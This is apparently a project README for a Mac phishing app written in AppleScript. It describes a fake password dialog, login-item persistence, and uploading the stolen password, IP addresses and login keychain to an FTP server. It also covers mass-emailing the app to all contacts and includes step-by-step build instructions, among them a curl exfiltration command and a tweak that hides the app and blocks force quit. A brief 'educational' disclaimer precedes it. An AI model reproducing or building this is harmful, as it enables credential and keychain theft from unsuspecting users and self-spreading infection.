Benb116's Phishing app for Mac
==========================

**Use this tool at your own risk. Don't do anything illegal. I do not accept any responsibility for any damages or harm done. This is purely an educational endeavor (for me).**

This is a phishing app that I wrote. It is written in applescript, which is important because it shows that potentially harmful tools can be written using a simple language and relatively limited programming knowledge. It is small and works on macs, whose users often don't worry about malware on their computers. This makes the app more effective, especially when disguised as a music file or photo. 

**Here's what it does:**

* It makes a new hidden directory in the user's public folder, then checks for a killswitch
* It copies a duplicate of itself to the folder and sets it as a login item
* It prompts the user to enter their password into a dialog box. If the user doesn't enter it within 10 seconds, the script sets itself as a login item, then kills all user processes, making the user have to restart in order to use the computer.
![image](http://f.cl.ly/items/3E0x2P0l452W2B1p2T0m/Prompt.png)
*  It copies the password, username, date, WAN IP, and LAN IP to a text file in the hidden folder in the user's public folder ![image](http://cl.ly/KB3S/Screenshot%202012-10-16%20at%206.47.02%20AM.jpg)
*  It uploads this file to an FTP server
*  It copies the user's login keychain into the same folder and uploads it to the same FTP server
*  It sends an email to all of the user's contacts' emails with the app attached.

The script is saved as an application with a duplicate application inside of it. It copies the inner application to the hidden folder and sets it as a login item.

 **Please feel free to test the script by doing the following:**

1. In 'App.applescript' and 'Updater.applescript' find the command that uploads the text file to an FTP server.
2. Replace the parts of the code in '<>' with your information.
	
				tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
		
	becomes
	
			tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u Benb116:1234 ftp://123.456.789.0/Desktop/Passwords/" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server3. Repeat steps 1 and 2 in both files with the command that uploads the keychain file.
4. Save App.applescript as an application (example name "App.app")
5. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder

		<key>NSUIElement</key>
        <string>1</string>
(this prevents a dock icon from appearing and also makes it impossible to force quit the app)
6. Add the file "icon.icns" to the resources folder of "App.app"
7. Save Updater.applescript as an application named "Updater.app"
8. Repeat step 5 and 6 for "Updater.app"
9. Copy Updater.app to the resources folder "App.app"

The resources folder of the "App.app" should look something like this:

![image](http://f.cl.ly/items/2e1H2C3p1L401D1a3944/Screen%20Shot%202012-12-18%20at%207.55.22%20PM.png)
